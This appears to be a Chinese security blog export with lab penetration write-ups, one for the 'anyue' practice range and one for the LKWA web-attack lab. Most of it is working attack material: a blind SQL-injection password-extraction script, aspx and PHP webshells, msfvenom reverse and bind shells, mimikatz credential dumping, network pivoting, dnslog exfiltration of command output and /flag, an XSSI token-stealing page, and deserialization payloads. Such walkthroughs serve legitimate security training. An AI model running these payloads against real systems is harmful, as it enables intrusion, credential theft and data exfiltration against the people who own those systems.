<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">opener = urllib2.build_opener()</span><br><span class="line">opener.addheaders.append((<span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;PHPSESSID=uhbt6mbnc1bhhp5vsv9hcqra67; DedeUserID=4; DedeUserID__ckMd5=f02b1d395cb070ca; DedeLoginTime=1683939227; DedeLoginTime__ckMd5=27e4a208f2a79ee8; ENV_GOBACK_URL=%2Fmember%2Fcontent_list.php%3Fchannelid%3D1&#x27;</span>))</span><br><span class="line">payloads = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789@_.&#x27;</span></span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>): </span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payloads:</span><br><span class="line">        s1 = <span class="string">&quot;%s&quot;</span> %(i)</span><br><span class="line">        s2 = <span class="string">&quot;%s&quot;</span> %(<span class="built_in">ord</span>(p))</span><br><span class="line">        url = <span class="string">&quot;http://new.cc123.com/member/mtypes.php&quot;</span></span><br><span class="line">        s = url + <span class="string">&quot;?dopost=save&amp;_FILES[mtypename][name]=.xxxx&amp;_FILES[mtypename][type]=xxxxx&amp;_FILES[mtypename][tmp_name][a&#x27;%20and%20`&#x27;`.``.mtypeid%20or%20if(ascii(substr((select%20pwd%20from%20dede_admin%20limit%201),&quot;</span>+s1+<span class="string">&quot;,1))%3d&quot;</span>+s2+<span class="string">&quot;,sleep(3),0)%20and%20mtypeid%3d1%23]=w&amp;_FILES[mtypename][size]=.xxxx&quot;</span></span><br><span class="line">        </span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = urllib2.Request(s)            </span><br><span class="line">            req_data=opener.<span class="built_in">open</span>(req,timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">2.0</span>:</span><br><span class="line">                name = name+p</span><br><span class="line">                <span class="built_in">print</span> name+<span class="string">&#x27;.....&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> urllib2.URLError,e:</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;password is %s&#x27;</span>  % name</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513094137979.png" alt="image-20230513094137979"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513094144066.png" alt="image-20230513094144066"></p>
<p>登陆后台管理系统，<code>http://new.cc123.com/dede/</code>，发现了可以上传木马文件，尝试用蚁剑连接，成功。<strong>但是无法成功执行命令，这也就是为什么我们没有办法反弹shell的原因。</strong></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513102311510.png" alt="image-20230513102311510"></p>
<p>这里根据网站目录发现可能支持 asp.net，而且相较于 php，.net的权限更加大，这里尝试上传 aspx 木马。</p>
<blockquote>
<p><a href="https://blog.csdn.net/cplvfx/article/details/79192183">(30条消息) aspxspy.aspx“木马”文件又名专版aspx汗血宝马_橙-极纪元的博客-CSDN博客</a></p>
<p><a href="https://github.com/tennc/webshell/blob/master/aspx/AspxSpy2014Final.aspx">webshell&#x2F;AspxSpy2014Final.aspx at master · tennc&#x2F;webshell · GitHub</a></p>
</blockquote>
<p>上传该木马，登陆密码为 admin，发现可以执行相关命令。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513104531485.png" alt="image-20230513104531485"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.128 lport=5555 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.0.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 5555</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513110847794.png" alt="image-20230513110847794"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513111441771.png" alt="image-20230513111441771"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">msf6 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester		# 寻找本地提权漏洞</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 1</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513115303055.png" alt="image-20230513115303055"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class="line">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set session 1</span><br><span class="line">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513132617694.png" alt="image-20230513132617694"></p>
<h3 id="ww2-cc123-com"><a href="#ww2-cc123-com" class="headerlink" title="ww2.cc123.com"></a>ww2.cc123.com</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://ww2.cc123.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#x27;aspx,html&#x27; -b 400-599</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513135329446.png" alt="image-20230513135329446"></p>
<p>发现后台，通过抓包提交，发现存在<strong>验证码的重用</strong>，可以爆破密码。</p>
<p>除此以外测试一下 SQL注入，通过闭合用户名和注释，发现绕过了密码的判断，出现了 302 重定向。也就是说只判断了表中是否有 admin，如果有就进行跳转。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513140108686.png" alt="image-20230513140108686"></p>
<p>进入后台我们发现了可以添加或者是修改管理员。同时我们也发现了留言板的 xss。</p>
<p>除此以外，在新闻资讯列表中发现修改信息时存在 sql注入。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513141752128.png" alt="image-20230513141752128"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513141803212.png" alt="image-20230513141803212"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt --dbms mssql --current-user --current-db --dbs --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513142438791.png" alt="image-20230513142438791"></p>
<p>发现用户是<code>sa</code>，<code>sa</code>是SQL Server数据库中的系统管理员账户，具有最高权限。它可以访问和管理所有数据库，并且可以执行任何操作，包括创建、修改和删除数据库对象，更改数据库配置选项等。因此，<code>sa</code>账户通常被用作在SQL Server上运行的应用程序的默认管理员账户。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt --dbms mssql --os-shell --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513170907038.png" alt="image-20230513170907038"></p>
<p>除上述以外，我们发现了 kindeditor 的一个漏洞。</p>
<blockquote>
<p><a href="https://www.freebuf.com/column/202148.html">大批量Kindeditor文件上传事件的漏洞分析 - FreeBuf网络安全行业门户</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513165132916.png" alt="image-20230513165132916"></p>
<p>通过修改上传数据包中的 dir 字段为 file，我们就可以实现上传 html 文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513165220621.png" alt="image-20230513165220621"></p>
<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="Web服务器"><a href="#Web服务器" class="headerlink" title="Web服务器"></a>Web服务器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets		# 获取路由信息</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进程迁移</span></span><br><span class="line">meterpreter &gt; ps</span><br><span class="line">meterpreter &gt; migrate 1516</span><br><span class="line"></span><br><span class="line">meterpreter &gt; hashdump			# 获取密码哈希</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不同版本的 mimikatz 使用方法不同</span></span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; help kiwi</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">meterpreter &gt; kiwi_cmd -f sekurlsa::</span><br><span class="line">meterpreter &gt; kiwi_cmd -f sekurlsa::tspkg</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加路由，使得 msf 可以访问到内网</span></span><br><span class="line">meterpreter &gt; run autoroute -s 10.10.10.0/24</span><br><span class="line">meterpreter &gt; run autoroute -p			# 查看存在的路由</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 socket 代理，使得其他应用也能访问到内网</span></span><br><span class="line">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; info</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; set srvport 2222</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514192521102.png" alt="image-20230514192521102"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514192324836.png" alt="image-20230514192324836"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514194553564.png" alt="image-20230514194553564"></p>
<h3 id="数据库服务器"><a href="#数据库服务器" class="headerlink" title="数据库服务器"></a>数据库服务器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lport=13777 -f exe &gt; /home/pursue/anyue/practice4/bind.exe</span><br></pre></td></tr></table></figure>

<p>利用之前的 asp 木马进行数据库的上传文件和执行。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514194200018.png" alt="image-20230514194200018"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514195645993.png" alt="image-20230514195645993"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line">msf6 exploit(multi/handler) &gt; set rhost 10.10.10.129</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 13777</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514195753916.png" alt="image-20230514195753916"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514200139110.png" alt="image-20230514200139110"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 10.10.10.1/24</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br></pre></td></tr></table></figure>



<h3 id="目标服务器"><a href="#目标服务器" class="headerlink" title="目标服务器"></a>目标服务器</h3><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514200959718.png" alt="image-20230514200959718"></p>
<blockquote>
<p>漏洞利用：<a href="https://blog.csdn.net/JSH_CDX/article/details/108518015">(30条消息) phpstudy后门任意代码执行漏洞验证_phpstudy探针2014漏洞_JSH_CDX的博客-CSDN博客</a></p>
</blockquote>
<p>发现没有回显尝试写入 webshell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&quot;echo ^&lt;?php @eval(\$_POST[\&quot;shell\&quot;])?^&gt;&gt;c:\phpstudy\WWW\shell.php&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514204948019.png" alt="image-20230514204948019"></p>
<p>使用 SocksCap64 使得我们的主机可以访问到目标服务器。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514210039565.png" alt="image-20230514210039565"></p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>暗月</tag>
      </tags>
  </entry>
  <entry>
    <title>LKWA 靶场学习</title>
    <url>/2023/04/25/Web/LKWA/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>项目地址：<a href="https://github.com/weev3/LKWA">weev3&#x2F;LKWA: Lesser Known Web Attack Lab (github.com)</a></p>
<h2 id="Blind-RCE"><a href="#Blind-RCE" class="headerlink" title="Blind RCE"></a>Blind RCE</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;sidebar.php&quot;</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Blind RCE</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rce</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user_input</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$level</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user_input = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user_input&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;user_input&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;level = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;level&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;level&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;user_input)) &#123;</span><br><span class="line">       </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        		<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;user_input);		</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="keyword">new</span> <span class="title class_">Rce</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$rce</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有echo，也就没有回显，只是执行。</p>
<p>利用 dnslog 回显的特点，一个免费的网站：<a href="http://www.dnslog.cn/">DNSLog Platform</a>。点击首先获取一个 SubDomain。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping `whoami`.9et4ix.dnslog.cn</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">ping admin.9et4ix.dnslog.cn</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">windows</span></span><br><span class="line">ping %USERNAME%.9et4ix.dnslog.cn</span><br><span class="line"></span><br><span class="line">ls / | awk -F &#x27; &#x27; &#x27;&#123;system(&quot;ping -c 2 &quot;NR&quot;.9et4ix.dnslog.cn&quot;)&#125;&#x27;		# 查看根目录文件数</span><br><span class="line">ls / | awk -F&#x27; &#x27; &#x27;NR==1&#123;system(&quot;ping -c 1 &quot;$0&quot;.9et4ix.dnslog.cn&quot;)&#125;&#x27;		# 查看根目录的第一个文件</span><br><span class="line">ping -c 1 `cat /flag`.9et4ix.dnslog.cn</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="XSSI"><a href="#XSSI" class="headerlink" title="XSSI"></a>XSSI</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// xssi.php</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.<span class="title function_ invoke__">ajax</span>(		// 向服务器中发送异步 HTTP 请求</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&quot;../api/user&quot;</span>,</span><br><span class="line">            <span class="attr">type</span>:<span class="string">&quot;GET&quot;</span>,</span><br><span class="line">            <span class="attr">async</span>:<span class="literal">true</span>,			// 异步请求</span><br><span class="line">            <span class="attr">success</span>:function(parse)&#123;		<span class="comment">// 定义一个成功的回调函数，在服务器成功返回数据后被调用</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i in parse)&#123;		<span class="comment">// 回调函数首先遍历服务器返回的数据对象 parse 中的所有属性和值</span></span><br><span class="line">                    <span class="comment">// 对于每个属性名 i，通过 $() 方法选取对应的 HTML 元素，并设置其文本内容为该属性的值</span></span><br><span class="line">                    $(<span class="string">&quot;#&quot;</span> + i).<span class="title function_ invoke__">text</span>(parse[i]); </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">get</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>存在一个 ajax 请求，AJAX 技术通过在客户端浏览器中运行 JavaScript 代码，向服务器发送异步 HTTP 请求，接收和处理服务器返回的数据，并将数据插入到 Web 页面中已经存在的 HTML 标签内。</p>
<p>在 .&#x2F;api 目录下，存在重写也就是将 user 定位到 user.php。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// user.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login_user&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_user&#x27;</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">  <span class="variable">$myObj</span> = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();     <span class="comment">// 创建默认的空对象</span></span><br><span class="line">  <span class="variable">$myObj</span>-&gt;name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">  <span class="variable">$myObj</span>-&gt;token=<span class="title function_ invoke__">time</span>()+<span class="number">2</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>;</span><br><span class="line">  <span class="variable">$data</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$myObj</span>);			<span class="comment">// 编码为 JSON 字符串</span></span><br><span class="line">    <span class="comment">// 如果包含了 callback 参数，那么返回 JSONP</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;callback&#x27;</span>, <span class="variable">$_GET</span>))&#123;</span><br><span class="line"></span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/javascript; charset=utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Max-Age: 3628800&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Methods: GET, POST, PUT, DELETE&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data</span>.<span class="string">&#x27;);&#x27;</span>;		<span class="comment">// 形成函数调用的语法结构</span></span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json; charset=utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$myObj</span> = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">  <span class="variable">$myObj</span>-&gt;name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="variable">$myObj</span>-&gt;token=<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="variable">$data</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$myObj</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;callback&#x27;</span>, <span class="variable">$_GET</span>))&#123;</span><br><span class="line"></span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/javascript; charset=utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Max-Age: 3628800&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Methods: GET, POST, PUT, DELETE&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data</span>.<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="comment">// normal JSON string</span></span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json; charset=utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>JSONP（JSON with Padding）是一种跨域数据请求技术，JSONP 在前端页面中通过动态插入一个 <code>&lt;script&gt;</code> 标签，向另一个域名的服务器发送请求，请求的 URL 中包含一个回调函数名作为参数。后台服务器接收到这个请求并根据参数生成对应格式的 JSON 数据返回，并将其中的数据作为参数传递给回调函数。在前端页面中，这个回调函数会在 <code>&lt;script&gt;</code> 标签加载完毕时自动执行，从而实现对 JSON 数据的获取和处理。</p>
<p>下面是一个简单的 JSONP 请求示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getJSONP</span>(<span class="params">url, callback</span>) &#123;		<span class="comment">// 向服务器请求 JSONP 数据</span></span><br><span class="line">  <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  script.<span class="property">src</span> = url + <span class="string">&#x27;&amp;callback=&#x27;</span> + callback;		<span class="comment">// 传入回调函数</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleData</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Received data:&#x27;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getJSONP</span>(<span class="string">&#x27;https://example.com/api/data?format=json&#x27;</span>, <span class="string">&#x27;handleData&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>这里逻辑就清楚了，当我们以 GET 形式请求 <code>/api/user.php</code>，如果存在 SEESION 的值且为 admin 的话就可以那道 JSONP 数据了。</p>
<p>首先把浏览器的 cookie 清除访问：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230424200004421.png" alt="image-20230424200004421"></p>
<p>再次登录后访问：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230424201327320.png" alt="image-20230424201327320"></p>
<p>利用脚本：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">xssi</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://www.lkwa.com/api/user?callback=xssi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="PHP-Object-Injection"><a href="#PHP-Object-Injection" class="headerlink" title="PHP Object Injection"></a>PHP Object Injection</h2><p>常规的反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span> . <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;&lt;? php phpinfo(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="PHP-Object-Injection-cookie"><a href="#PHP-Object-Injection-cookie" class="headerlink" title="PHP Object Injection(cookie)"></a>PHP Object Injection(cookie)</h2><p>可以发现 cookie 存在反序列化内容</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230424203311479.png" alt="image-20230424203311479"></p>
